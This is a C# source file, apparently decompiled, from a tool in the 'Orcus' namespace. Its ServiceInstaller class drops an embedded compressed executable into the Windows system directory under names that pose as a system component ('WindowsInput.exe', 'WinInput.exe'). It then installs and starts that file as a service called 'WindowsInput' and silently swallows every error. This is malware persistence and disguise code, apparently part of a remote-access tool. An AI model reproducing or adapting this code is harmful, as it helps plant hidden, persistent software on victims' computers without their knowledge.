using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using Orcus.Extensions;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.Service;

internal class ServiceInstaller
{
	public static void InstallIfNotExist()
	{
		if (ServiceController.GetServices().Any((ServiceController s) => s.get_ServiceName() == "WindowsInput"))
		{
			return;
		}
		try
		{
			FileInfo freeFilename = GetFreeFilename();
			try
			{
				ResourceHelper.WriteGZippedResourceToFile(freeFilename.FullName, "Orcus.Service.exe.gz");
				AppConfigWriter.WriteAppConfig(freeFilename);
			}
			catch (Exception)
			{
				return;
			}
			Process.Start(freeFilename.FullName, "--install")?.WaitForExit(20000);
			try
			{
				StartService("WindowsInput", 5000);
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void Uninstall()
	{
		if (ServiceConnection.Current.IsConnected && User.IsAdministrator)
		{
			FileInfo fileInfo = new FileInfo(ServiceConnection.Current.Pipe.GetPath());
			if (fileInfo.Exists)
			{
				Process.Start(fileInfo.FullName, "--uninstall").WaitForExit();
				fileInfo.Delete();
			}
		}
	}

	private static FileInfo GetFreeFilename()
	{
		string[] array = new string[4] { "WindowsInput.exe", "WinInput.exe", "WinInp.exe", "Input.exe" };
		string systemDirectory = EnvironmentExtensions.SystemDirectory;
		int num = 0;
		FileInfo fileInfo;
		while (true)
		{
			if (num < array.Length)
			{
				fileInfo = new FileInfo(Path.Combine(systemDirectory, array[num]));
				if (!fileInfo.Exists)
				{
					break;
				}
				num++;
				continue;
			}
			return new FileInfo(FileExtensions.MakeUnique(Path.Combine(systemDirectory, array[0])));
		}
		return fileInfo;
	}

	public static void StartService(string serviceName, int timeoutMilliseconds)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		ServiceController val = new ServiceController(serviceName);
		try
		{
			TimeSpan timeSpan = TimeSpan.FromMilliseconds(timeoutMilliseconds);
			val.Start();
			val.WaitForStatus((ServiceControllerStatus)4, timeSpan);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}
}
